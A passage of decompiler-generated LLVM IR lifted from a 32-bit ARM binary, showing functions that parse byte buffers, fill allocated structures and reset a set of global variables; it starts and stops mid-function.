dec_label_pc_a02c:                                ; preds = %dec_label_pc_a020, %dec_label_pc_9fe0, %dec_label_pc_a034
  %v1_a030 = call i32 @function_12ee4(i32 0)
  %v0_a044.pre = load i32, i32* @ip, align 4
  br label %dec_label_pc_a034

dec_label_pc_a034:                                ; preds = %dec_label_pc_a010, %dec_label_pc_9ff0, %dec_label_pc_a02c
  %v0_a044 = phi i32 [ %v2_9ff8, %dec_label_pc_9ff0 ], [ %v0_a044.pre, %dec_label_pc_a02c ], [ %v7_a010, %dec_label_pc_a010 ]
  %v1_a044 = inttoptr i32 %v0_a044 to i32*
  %v2_a044 = load i32, i32* %v1_a044, align 4
  call void @__pseudo_branch(i32 %v2_a044)
  br label %dec_label_pc_a02c

; uselistorder directives
  uselistorder i32 %v1_a020, { 2, 0, 1 }
  uselistorder i32 %v0_9fa4, { 1, 2, 0 }
  uselistorder i1 %v7_9f7c, { 1, 0 }
  uselistorder i32 %v0_9f78, { 1, 2, 0 }
  uselistorder label %dec_label_pc_a034, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a02c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_a020, { 1, 0 }
  uselistorder label %dec_label_pc_9fe0, { 1, 0 }
  uselistorder label %dec_label_pc_9fd8, { 1, 0 }
  uselistorder label %dec_label_pc_9f9c, { 1, 0 }
}

define i32 @function_a05c(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_a05c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_a060 = icmp ugt i32 %arg2, 2
  %v7_a060 = icmp eq i32 %arg2, 3
  store i1 %v7_a060, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg2, i32* @r4, align 4
  %v0_a06c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_a06c, i32* @r5, align 4
  %v2_a070 = xor i1 %v7_a060, true
  %v3_a070 = and i1 %v2_a060, %v2_a070
  br i1 %v3_a070, label %dec_label_pc_a080, label %dec_label_pc_a074

dec_label_pc_a074:                                ; preds = %dec_label_pc_a0b0, %.dec_label_pc_a074_crit_edge, %dec_label_pc_a0a4, %dec_label_pc_a094, %dec_label_pc_a080, %dec_label_pc_a05c, %dec_label_pc_a25c
  %v1_a07c = phi i32 [ %v1_a07c.pre, %.dec_label_pc_a074_crit_edge ], [ %v1_a084, %dec_label_pc_a0b0 ], [ %v1_a084, %dec_label_pc_a0a4 ], [ %v1_a084, %dec_label_pc_a094 ], [ %v1_a084, %dec_label_pc_a080 ], [ %v0_a06c, %dec_label_pc_a05c ], [ %v1_a260, %dec_label_pc_a25c ]
  ret i32 %v1_a07c

dec_label_pc_a080:                                ; preds = %dec_label_pc_a05c
  %v1_a080 = inttoptr i32 %v0_a06c to i32*
  %v2_a080 = load i32, i32* %v1_a080, align 4
  store i32 %v2_a080, i32* %r0.global-to-local, align 4
  %v1_a084 = call i32 @function_149d0(i32 %v2_a080)
  store i32 %v1_a084, i32* %r0.global-to-local, align 4
  %v0_a088 = load i32, i32* @r4, align 4
  %v7_a088 = icmp eq i32 %v0_a088, 4
  store i1 %v7_a088, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a084, i32* @fp, align 4
  br i1 %v7_a088, label %dec_label_pc_a074, label %dec_label_pc_a094

dec_label_pc_a094:                                ; preds = %dec_label_pc_a080
  %v0_a094 = load i32, i32* @r5, align 4
  %v1_a094 = add i32 %v0_a094, 4
  %v2_a094 = inttoptr i32 %v1_a094 to i8*
  %v3_a094 = load i8, i8* %v2_a094, align 1
  %v4_a094 = zext i8 %v3_a094 to i32
  %v7_a098 = icmp eq i32 %v0_a088, 5
  store i1 %v7_a098, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_a098, label %dec_label_pc_a074, label %dec_label_pc_a0a4

dec_label_pc_a0a4:                                ; preds = %dec_label_pc_a094
  %v1_a0a4 = add i32 %v0_a094, 5
  %v2_a0a4 = inttoptr i32 %v1_a0a4 to i8*
  %v3_a0a4 = load i8, i8* %v2_a0a4, align 1
  %v4_a0a4 = zext i8 %v3_a0a4 to i32
  store i32 %v4_a0a4, i32* @sb, align 4
  %v2_a0a8 = icmp eq i8 %v3_a0a4, 0
  store i1 %v2_a0a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a0a8, label %dec_label_pc_a074, label %dec_label_pc_a0b0

dec_label_pc_a0b0:                                ; preds = %dec_label_pc_a0a4
  %v2_a0b4 = mul nuw nsw i32 %v4_a0a4, 5
  store i32 %v2_a0b4, i32* @r7, align 4
  %v1_a0b8 = add i32 %v0_a088, -6
  store i32 %v1_a0b8, i32* %r3.global-to-local, align 4
  %v3_a0bc = icmp ult i32 %v1_a0b8, %v2_a0b4
  %v9_a0bc = icmp eq i32 %v1_a0b8, %v2_a0b4
  store i1 %v9_a0bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_a0bc, label %dec_label_pc_a074, label %dec_label_pc_a0c4

dec_label_pc_a0c4:                                ; preds = %dec_label_pc_a0b0
  store i32 %v4_a0a4, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_a0b8, i32* @r6, align 4
  %v2_a0d0 = call i32 @function_1320c(i32 %v4_a0a4, i32 24)
  store i32 %v2_a0d0, i32* %ip.global-to-local, align 4
  %v0_a0dc = load i32, i32* @r7, align 4
  %v1_a0dc = load i32, i32* @r4, align 4
  %v2_a0dc = sub i32 %v1_a0dc, %v0_a0dc
  store i32 %v2_a0dc, i32* @r7, align 4
  %v0_a0e0 = load i32, i32* @r5, align 4
  %v1_a0e0 = add i32 %v0_a0e0, 11
  store i32 %v1_a0e0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a0e4

dec_label_pc_a0e4:                                ; preds = %dec_label_pc_a0e4, %dec_label_pc_a0c4
  %v1_a0e8 = phi i32 [ %v1_a114, %dec_label_pc_a0e4 ], [ %v2_a0d0, %dec_label_pc_a0c4 ]
  %v0_a0e4 = phi i32 [ %v1_a110, %dec_label_pc_a0e4 ], [ %v1_a0e0, %dec_label_pc_a0c4 ]
  %v1_a0e4 = add i32 %v0_a0e4, -5
  %v2_a0e4 = inttoptr i32 %v1_a0e4 to i32*
  %v3_a0e4 = load i32, i32* %v2_a0e4, align 4
  store i32 %v3_a0e4, i32* %r1.global-to-local, align 4
  %v2_a0e8 = add i32 %v1_a0e8, 16
  %v3_a0e8 = inttoptr i32 %v2_a0e8 to i32*
  store i32 %v3_a0e4, i32* %v3_a0e8, align 4
  %v0_a0ec = load i32, i32* @r7, align 4
  %v1_a0ec = add i32 %v0_a0ec, -6
  store i32 %v1_a0ec, i32* %r3.global-to-local, align 4
  %v0_a0f0 = load i32, i32* %r0.global-to-local, align 4
  %v1_a0f0 = add i32 %v0_a0f0, -1
  %v2_a0f0 = inttoptr i32 %v1_a0f0 to i8*
  %v3_a0f0 = load i8, i8* %v2_a0f0, align 1
  %v4_a0f0 = zext i8 %v3_a0f0 to i32
  store i32 %v4_a0f0, i32* @r2, align 4
  %v0_a0f4 = load i32, i32* @r6, align 4
  %v1_a0f4 = add i32 %v0_a0f4, -5
  store i32 %v1_a0f4, i32* @r6, align 4
  %v9_a0f8 = icmp eq i32 %v1_a0f4, %v1_a0ec
  store i1 %v9_a0f8, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_a0f0, i32* @r4, align 4
  %v2_a104 = load i32, i32* %ip.global-to-local, align 4
  %v3_a104 = add i32 %v2_a104, 20
  %v4_a104 = inttoptr i32 %v3_a104 to i8*
  store i8 %v3_a0f0, i8* %v4_a104, align 1
  %v0_a108 = load i32, i32* %r1.global-to-local, align 4
  %v1_a108 = load i32, i32* %ip.global-to-local, align 4
  %v2_a108 = add i32 %v1_a108, 4
  %v3_a108 = inttoptr i32 %v2_a108 to i32*
  store i32 %v0_a108, i32* %v3_a108, align 4
  %v0_a10c = load i32, i32* %r3.global-to-local, align 4
  %v1_a10c = trunc i32 %v0_a10c to i16
  %v2_a10c = load i32, i32* %ip.global-to-local, align 4
  %v3_a10c = inttoptr i32 %v2_a10c to i16*
  store i16 %v1_a10c, i16* %v3_a10c, align 2
  %v0_a110 = load i32, i32* %r0.global-to-local, align 4
  %v1_a110 = add i32 %v0_a110, 5
  store i32 %v1_a110, i32* %r0.global-to-local, align 4
  %v0_a114 = load i32, i32* %ip.global-to-local, align 4
  %v1_a114 = add i32 %v0_a114, 24
  store i32 %v1_a114, i32* %ip.global-to-local, align 4
  %v0_a118 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a118, label %dec_label_pc_a11c, label %dec_label_pc_a0e4

dec_label_pc_a11c:                                ; preds = %dec_label_pc_a0e4
  %v0_a11c = load i32, i32* @r6, align 4
  %v2_a11c = icmp eq i32 %v0_a11c, 0
  store i1 %v2_a11c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a11c, label %dec_label_pc_a220, label %dec_label_pc_a124

dec_label_pc_a124:                                ; preds = %dec_label_pc_a11c
  %v0_a124 = load i32, i32* @r4, align 4
  %v1_a124 = inttoptr i32 %v0_a124 to i8*
  %v2_a124 = load i8, i8* %v1_a124, align 1
  %v3_a124 = zext i8 %v2_a124 to i32
  store i32 %v3_a124, i32* @r5, align 4
  %v2_a128 = icmp eq i8 %v2_a124, 0
  store i1 %v2_a128, i1* %cpsr_z.global-to-local, align 1
  %v0_a12c = load i32, i32* @r7, align 4
  %v1_a12c = add i32 %v0_a12c, -7
  store i32 %v1_a12c, i32* @r8, align 4
  br i1 %v2_a128, label %bb, label %dec_label_pc_a138

bb:                                               ; preds = %dec_label_pc_a124
  store i32 %v3_a124, i32* @r6, align 4
  br label %dec_label_pc_a1fc

dec_label_pc_a138:                                ; preds = %dec_label_pc_a124
  store i32 %v3_a124, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_a140 = call i32 @function_1320c(i32 %v3_a124, i32 8)
  store i32 %v2_a140, i32* %r0.global-to-local, align 4
  %v0_a144 = load i32, i32* @r8, align 4
  %v2_a144 = icmp eq i32 %v0_a144, 0
  store i1 %v2_a144, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_a140, i32* @r6, align 4
  br i1 %v2_a144, label %dec_label_pc_a220, label %dec_label_pc_a150

dec_label_pc_a150:                                ; preds = %dec_label_pc_a138
  %v0_a150 = load i32, i32* @r4, align 4
  %v1_a150 = add i32 %v0_a150, 1
  %v2_a150 = inttoptr i32 %v1_a150 to i8*
  %v3_a150 = load i8, i8* %v2_a150, align 1
  %v0_a154 = load i32, i32* @r7, align 4
  %v7_a154 = icmp eq i32 %v0_a154, 8
  store i1 %v7_a154, i1* %cpsr_z.global-to-local, align 1
  %v3_a158 = add i32 %v2_a140, 4
  %v4_a158 = inttoptr i32 %v3_a158 to i8*
  store i8 %v3_a150, i8* %v4_a158, align 1
  %v0_a15c = load i32, i32* @r4, align 4
  %v1_a15c = add i32 %v0_a15c, 1
  store i32 %v1_a15c, i32* %r3.global-to-local, align 4
  %v0_a160 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a160, label %dec_label_pc_a220, label %dec_label_pc_a164

dec_label_pc_a164:                                ; preds = %dec_label_pc_a150
  %v1_a164 = add i32 %v0_a15c, 2
  %v2_a164 = inttoptr i32 %v1_a164 to i8*
  %v3_a164 = load i8, i8* %v2_a164, align 1
  %v4_a164 = zext i8 %v3_a164 to i32
  store i32 %v4_a164, i32* @r4, align 4
  %v0_a168 = load i32, i32* @r7, align 4
  %v1_a168 = add i32 %v0_a168, -9
  store i32 %v1_a168, i32* @r8, align 4
  %v9_a16c = icmp eq i32 %v1_a168, %v4_a164
  store i1 %v9_a16c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_a164, i32* %r1.global-to-local, align 4
  %v5_a174 = icmp slt i32 %v1_a168, %v4_a164
  br i1 %v5_a174, label %dec_label_pc_a220, label %bb35

bb35:                                             ; preds = %dec_label_pc_a164
  %v7_a1787 = add i32 %v0_a15c, 3
  store i32 %v7_a1787, i32* @r7, align 4
  %v6_a17c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_a17c, i32* @sl, align 4
  br label %dec_label_pc_a1c0

dec_label_pc_a18c:                                ; preds = %dec_label_pc_a1c0
  %v0_a18c = load i32, i32* @r8, align 4
  %v1_a18c = load i32, i32* @r4, align 4
  %v2_a18c = sub i32 %v0_a18c, %v1_a18c
  store i32 %v2_a18c, i32* @r2, align 4
  %v9_a18c = icmp eq i32 %v0_a18c, %v1_a18c
  store i1 %v9_a18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_a18c, label %dec_label_pc_a220, label %dec_label_pc_a194

dec_label_pc_a194:                                ; preds = %dec_label_pc_a18c
  %v1_a194 = load i32, i32* @r7, align 4
  %v2_a194 = add i32 %v1_a194, %v1_a18c
  %v3_a194 = inttoptr i32 %v2_a194 to i8*
  %v4_a194 = load i8, i8* %v3_a194, align 1
  store i32 %v2_a194, i32* %r0.global-to-local, align 4
  %v1_a19c = add i32 %v2_a18c, -1
  store i32 %v1_a19c, i32* @r2, align 4
  %v7_a19c = icmp eq i32 %v2_a18c, 1
  store i1 %v7_a19c, i1* %cpsr_z.global-to-local, align 1
  %v3_a1a0 = add i32 %v2_a1f4, 4
  %v4_a1a0 = inttoptr i32 %v3_a1a0 to i8*
  store i8 %v4_a194, i8* %v4_a1a0, align 1
  %v0_a1a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_a1a4 = add i32 %v0_a1a4, 1
  store i32 %v1_a1a4, i32* %r3.global-to-local, align 4
  %v0_a1a8 = load i32, i32* @r2, align 4
  %v1_a1a8 = add i32 %v0_a1a8, -1
  store i32 %v1_a1a8, i32* @r8, align 4
  %v1_a1ac = add i32 %v0_a1a4, 2
  store i32 %v1_a1ac, i32* @r7, align 4
  %v0_a1b0 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_a1b0, label %dec_label_pc_a220, label %dec_label_pc_a1b4

dec_label_pc_a1b4:                                ; preds = %dec_label_pc_a194
  %v2_a1b4 = inttoptr i32 %v1_a1a4 to i8*
  %v3_a1b4 = load i8, i8* %v2_a1b4, align 1
  %v4_a1b4 = zext i8 %v3_a1b4 to i32
  store i32 %v4_a1b4, i32* @r4, align 4
  %v2_a1b8 = sub i32 %v1_a1a8, %v4_a1b4
  %tmp36 = sub i32 0, %v2_a1b8
  %v6_a1b8 = and i32 %v1_a1a8, %tmp36
  %v7_a1b8 = icmp slt i32 %v6_a1b8, 0
  %v8_a1b8 = icmp slt i32 %v2_a1b8, 0
  %v9_a1b8 = icmp eq i32 %v1_a1a8, %v4_a1b4
  store i1 %v9_a1b8, i1* %cpsr_z.global-to-local, align 1
  %v2_a1bc = xor i1 %v8_a1b8, %v7_a1b8
  br i1 %v2_a1bc, label %dec_label_pc_a220, label %dec_label_pc_a1c0

dec_label_pc_a1c0:                                ; preds = %bb35, %dec_label_pc_a1b4
  %v0_a1c4 = phi i32 [ %v4_a164, %bb35 ], [ %v4_a1b4, %dec_label_pc_a1b4 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_a1d4, %dec_label_pc_a1b4 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_a1c4 = add nuw nsw i32 %v0_a1c4, 1
  store i32 %v1_a1c4, i32* %r0.global-to-local, align 4
  %v2_a1c8 = call i32 @function_1320c(i32 %v1_a1c4, i32 1)
  store i32 %v2_a1c8, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_a1d0 = load i32, i32* @sl, align 4
  %v2_a1d0 = inttoptr i32 %v1_a1d0 to i32*
  store i32 %v2_a1c8, i32* %v2_a1d0, align 4
  %v0_a1d4 = load i32, i32* %r3.global-to-local, align 4
  %v1_a1d4 = add i32 %v0_a1d4, 1
  store i32 %v1_a1d4, i32* %r3.global-to-local, align 4
  %v0_a1d8 = load i32, i32* @r4, align 4
  %v0_a1dc = load i32, i32* @r7, align 4
  store i32 %v0_a1dc, i32* %r1.global-to-local, align 4
  %v3_a1e4 = call i32 @function_12394(i32 %v2_a1c8, i32 %v0_a1dc, i32 %v0_a1d8)
  store i32 %v3_a1e4, i32* %r0.global-to-local, align 4
  %v3_a1ec = mul i32 %v1_a1d4, 8
  store i32 %v3_a1ec, i32* %r3.global-to-local, align 4
  %v1_a1f0 = load i32, i32* @r5, align 4
  %v9_a1f0 = icmp eq i32 %v1_a1d4, %v1_a1f0
  store i1 %v9_a1f0, i1* %cpsr_z.global-to-local, align 1
  %v0_a1f4 = load i32, i32* @r6, align 4
  %v2_a1f4 = add i32 %v0_a1f4, %v3_a1ec
  store i32 %v2_a1f4, i32* @sl, align 4
  br i1 %v9_a1f0, label %dec_label_pc_a1fc, label %dec_label_pc_a18c

dec_label_pc_a1fc:                                ; preds = %dec_label_pc_a1c0, %bb
  %v0_a1fc = call i32 @function_12ecc()
  %v2_a204 = inttoptr i32 %v0_a1fc to i32*
  store i32 0, i32* %v2_a204, align 4
  store i32 %v4_a094, i32* %r1.global-to-local, align 4
  %v0_a20c = load i32, i32* @fp, align 4
  store i32 %v0_a20c, i32* %r0.global-to-local, align 4
  %v0_a210 = load i32, i32* @sb, align 4
  store i32 %v2_a0d0, i32* %r3.global-to-local, align 4
  %v2_a218 = load i32, i32* @r5, align 4
  %v5_a218 = load i32, i32* @r6, align 4
  %v6_a21c = trunc i32 %v2_a218 to i8
  %v7_a21c = call i32 @function_9f60(i32 %v0_a20c, i32 %v4_a094, i32 %v0_a210, i32 %v2_a0d0, i8 %v6_a21c, i32 %v5_a218)
  store i32 %v7_a21c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a220

dec_label_pc_a220:                                ; preds = %dec_label_pc_a1b4, %dec_label_pc_a194, %dec_label_pc_a18c, %dec_label_pc_a164, %dec_label_pc_a150, %dec_label_pc_a138, %dec_label_pc_a11c, %dec_label_pc_a1fc
  store i32 %v2_a0d0, i32* %r3.global-to-local, align 4
  %v2_a224 = icmp eq i32 %v2_a0d0, 0
  store i1 %v2_a224, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a224, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_a220
  store i32 %v2_a0d0, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_a220, %bb37
  store i32 41520, i32* @lr, align 4
  %v1_a22c = xor i1 %v2_a224, true
  call void @__pseudo_cond_branch(i1 %v1_a22c, i32 ptrtoint (i32* @global_var_13780.57 to i32))
  %v0_a230 = load i32, i32* @r6, align 4
  %v2_a230 = icmp eq i32 %v0_a230, 0
  store i1 %v2_a230, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a230, label %.dec_label_pc_a074_crit_edge, label %dec_label_pc_a238

.dec_label_pc_a074_crit_edge:                     ; preds = %bb38
  %v1_a07c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a074

dec_label_pc_a238:                                ; preds = %bb38
  %v0_a238 = load i32, i32* @r5, align 4
  %v2_a238 = icmp eq i32 %v0_a238, 0
  store i1 %v2_a238, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_a238, label %dec_label_pc_a25c, label %dec_label_pc_a240

dec_label_pc_a240:                                ; preds = %dec_label_pc_a238
  br label %dec_label_pc_a244

dec_label_pc_a244:                                ; preds = %dec_label_pc_a244, %dec_label_pc_a240
  %v0_a24c = phi i32 [ 0, %dec_label_pc_a240 ], [ %v1_a254, %dec_label_pc_a244 ]
  %v0_a244 = phi i32 [ %v0_a230, %dec_label_pc_a240 ], [ %v0_a25c.pre, %dec_label_pc_a244 ]
  %v4_a244 = mul i32 %v0_a24c, 8
  %v5_a244 = add i32 %v4_a244, %v0_a244
  %v6_a244 = inttoptr i32 %v5_a244 to i32*
  %v7_a244 = load i32, i32* %v6_a244, align 4
  store i32 %v7_a244, i32* %r0.global-to-local, align 4
  %v2_a248 = icmp eq i32 %v7_a244, 0
  store i1 %v2_a248, i1* %cpsr_z.global-to-local, align 1
  %v1_a24c = add i32 %v0_a24c, 1
  store i32 %v1_a24c, i32* @r4, align 4
  store i32 41556, i32* @lr, align 4
  %v1_a250 = xor i1 %v2_a248, true
  call void @__pseudo_cond_branch(i1 %v1_a250, i32 ptrtoint (i32* @global_var_13780.57 to i32))
  %v0_a254 = load i32, i32* @r5, align 4
  %v1_a254 = load i32, i32* @r4, align 4
  %v9_a254 = icmp eq i32 %v0_a254, %v1_a254
  store i1 %v9_a254, i1* %cpsr_z.global-to-local, align 1
  %v0_a25c.pre = load i32, i32* @r6, align 4
  br i1 %v9_a254, label %dec_label_pc_a25c, label %dec_label_pc_a244

dec_label_pc_a25c:                                ; preds = %dec_label_pc_a244, %dec_label_pc_a238
  %v0_a25c = phi i32 [ %v0_a230, %dec_label_pc_a238 ], [ %v0_a25c.pre, %dec_label_pc_a244 ]
  store i32 %v0_a25c, i32* %r0.global-to-local, align 4
  %v1_a260 = call i32 @function_13780(i32 %v0_a25c)
  store i32 %v1_a260, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_a074

; uselistorder directives
  uselistorder i32 %v1_a260, { 1, 0 }
  uselistorder i32 %v0_a25c, { 1, 0 }
  uselistorder i32 %v1_a254, { 1, 0 }
  uselistorder i1 %v2_a224, { 0, 2, 1 }
  uselistorder i32 %v2_a1f4, { 1, 0 }
  uselistorder i32 %v3_a1ec, { 1, 0 }
  uselistorder i32 %v1_a1d4, { 2, 0, 3, 1 }
  uselistorder i32 %v2_a1b8, { 1, 0 }
  uselistorder i32 %v4_a1b4, { 0, 2, 1, 3 }
  uselistorder i32 %v1_a1a8, { 2, 0, 1, 3 }
  uselistorder i32 %v3_a124, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a114, { 1, 0 }
  uselistorder i32 %v1_a110, { 1, 0 }
  uselistorder i32 %v2_a0d0, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_a0a4, { 1, 0, 2, 3 }
  uselistorder i32 %v1_a084, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v0_a06c, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0 }
  uselistorder i32* %r0.global-to-local, { 5, 2, 3, 22, 4, 23, 6, 21, 10, 9, 7, 8, 16, 17, 11, 12, 13, 14, 15, 18, 20, 19, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_a220, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_a1c0, { 1, 0 }
  uselistorder label %dec_label_pc_a074, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @function_a268(i32 %arg1) local_unnamed_addr {
dec_label_pc_a268:
  store i32 %arg1, i32* @r2, align 4
  store i32 ptrtoint (i32* @global_var_2232c.59 to i32), i32* @r4, align 4
  %v2_a270 = load i32, i32* @global_var_2232c.59, align 4
  store i32 %v2_a270, i32* @r0, align 4
  %v2_a274 = icmp eq i32 %v2_a270, 0
  br i1 %v2_a274, label %dec_label_pc_a280, label %dec_label_pc_a308

dec_label_pc_a280:                                ; preds = %dec_label_pc_a268
  %v3_a280 = load i32, i32* @global_var_22330.60, align 4
  store i32 %v3_a280, i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  %v2_a288 = icmp eq i32 %v3_a280, 0
  store i32 0, i32* @global_var_2232c.59, align 4
  br i1 %v2_a288, label %dec_label_pc_a294, label %dec_label_pc_a324

dec_label_pc_a294:                                ; preds = %dec_label_pc_a308.dec_label_pc_a294_crit_edge, %dec_label_pc_a280
  %v0_a29c = phi i32 [ %v0_a29c.pre, %dec_label_pc_a308.dec_label_pc_a294_crit_edge ], [ 0, %dec_label_pc_a280 ]
  %v3_a294 = load i32, i32* @global_var_22334.61, align 4
  store i32 %v3_a294, i32* @r0, align 4
  %v2_a298 = icmp eq i32 %v3_a294, 0
  store i32 %v0_a29c, i32* @global_var_22330.60, align 4
  br i1 %v2_a298, label %dec_label_pc_a2a4, label %dec_label_pc_a33c

dec_label_pc_a2a4:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a324
  %v0_a2ac = phi i32 [ %v0_a29c, %dec_label_pc_a294 ], [ %v0_a334, %dec_label_pc_a324 ]
  %v3_a2a4 = load i32, i32* @global_var_22338.62, align 4
  store i32 %v3_a2a4, i32* @r0, align 4
  %v2_a2a8 = icmp eq i32 %v3_a2a4, 0
  store i32 %v0_a2ac, i32* @global_var_22334.61, align 4
  br i1 %v2_a2a8, label %dec_label_pc_a2b4, label %dec_label_pc_a354

dec_label_pc_a2b4:                                ; preds = %dec_label_pc_a2a4, %dec_label_pc_a33c
  %v0_a2bc = phi i32 [ %v0_a2ac, %dec_label_pc_a2a4 ], [ %v0_a34c, %dec_label_pc_a33c ]
  %v3_a2b4 = load i32, i32* @global_var_2233c.63, align 4
  store i32 %v3_a2b4, i32* @r0, align 4
  %v2_a2b8 = icmp eq i32 %v3_a2b4, 0
  store i32 %v0_a2bc, i32* @global_var_22338.62, align 4
  br i1 %v2_a2b8, label %dec_label_pc_a2c4, label %dec_label_pc_a36c

dec_label_pc_a2c4:                                ; preds = %dec_label_pc_a2b4, %dec_label_pc_a354
  %v0_a2cc = phi i32 [ %v0_a2bc, %dec_label_pc_a2b4 ], [ %v0_a364, %dec_label_pc_a354 ]
  %v3_a2c4 = load i32, i32* @global_var_22340.64, align 4
  store i32 %v3_a2c4, i32* @r0, align 4
  %v2_a2c8 = icmp eq i32 %v3_a2c4, 0
  store i32 %v0_a2cc, i32* @global_var_2233c.63, align 4
  br i1 %v2_a2c8, label %dec_label_pc_a2d4, label %dec_label_pc_a384

dec_label_pc_a2d4:                                ; preds = %dec_label_pc_a2c4, %dec_label_pc_a36c
  %v0_a2dc = phi i32 [ %v0_a2cc, %dec_label_pc_a2c4 ], [ %v0_a37c, %dec_label_pc_a36c ]
  %v3_a2d4 = load i32, i32* @global_var_22344.65, align 4
  store i32 %v3_a2d4, i32* @r0, align 4
  %v2_a2d8 = icmp eq i32 %v3_a2d4, 0
  store i32 %v0_a2dc, i32* @global_var_22340.64, align 4
  br i1 %v2_a2d8, label %dec_label_pc_a2e4, label %dec_label_pc_a39c

dec_label_pc_a2e4:                                ; preds = %dec_label_pc_a2d4, %dec_label_pc_a384
  %v0_a2ec = phi i32 [ %v0_a2dc, %dec_label_pc_a2d4 ], [ %v0_a394, %dec_label_pc_a384 ]
  %v3_a2e4 = load i32, i32* @global_var_22348.66, align 4
  store i32 %v3_a2e4, i32* @r0, align 4
  %v2_a2e8 = icmp eq i32 %v3_a2e4, 0
  store i32 %v0_a2ec, i32* @global_var_22344.65, align 4
  br i1 %v2_a2e8, label %dec_label_pc_a2f4, label %dec_label_pc_a3b4

dec_label_pc_a2f4:                                ; preds = %dec_label_pc_a2e4, %dec_label_pc_a39c, %dec_label_pc_a3b4
  %v0_a2f4 = phi i32 [ %v0_a2ec, %dec_label_pc_a2e4 ], [ %v0_a3ac, %dec_label_pc_a39c ], [ %v0_a2f4.pre, %dec_label_pc_a3b4 ]
  store i32 %v0_a2f4, i32* @global_var_22348.66, align 4
  %v0_a2f8 = call i32 @function_ffe8()
  ret i32 %v0_a2f8

dec_label_pc_a308:                                ; preds = %dec_label_pc_a268
  %v2_a30c = call i32 @function_14dd8(i32 %v2_a270, i32 9)
  %v3_a310 = load i32, i32* @global_var_22330.60, align 4
  store i32 %v3_a310, i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  %v2_a318 = icmp eq i32 %v3_a310, 0
  %v1_a31c = load i32, i32* @r4, align 4
  %v2_a31c = inttoptr i32 %v1_a31c to i32*
  store i32 0, i32* %v2_a31c, align 4
  br i1 %v2_a318, label %dec_label_pc_a308.dec_label_pc_a294_crit_edge, label %dec_label_pc_a308.dec_label_pc_a324_crit_edge

dec_label_pc_a308.dec_label_pc_a294_crit_edge:    ; preds = %dec_label_pc_a308
  %v0_a29c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_a294

dec_label_pc_a308.dec_label_pc_a324_crit_edge:    ; preds = %dec_label_pc_a308
  %v0_a328.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_a324

dec_label_pc_a324:                                ; preds = %dec_label_pc_a308.dec_label_pc_a324_crit_edge, %dec_label_pc_a280
  %v0_a328 = phi i32 [ %v0_a328.pre, %dec_label_pc_a308.dec_label_pc_a324_crit_edge ], [ %v3_a280, %dec_label_pc_a280 ]
  %v2_a328 = call i32 @function_14dd8(i32 %v0_a328, i32 9)
  %v3_a32c = load i32, i32* @global_var_22334.61, align 4
  store i32 %v3_a32c, i32* @r0, align 4
  %v2_a330 = icmp eq i32 %v3_a32c, 0
  %v0_a334 = load i32, i32* @r5, align 4
  store i32 %v0_a334, i32* @global_var_22330.60, align 4
  br i1 %v2_a330, label %dec_label_pc_a2a4, label %dec_label_pc_a33c

dec_label_pc_a33c:                                ; preds = %dec_label_pc_a294, %dec_label_pc_a324
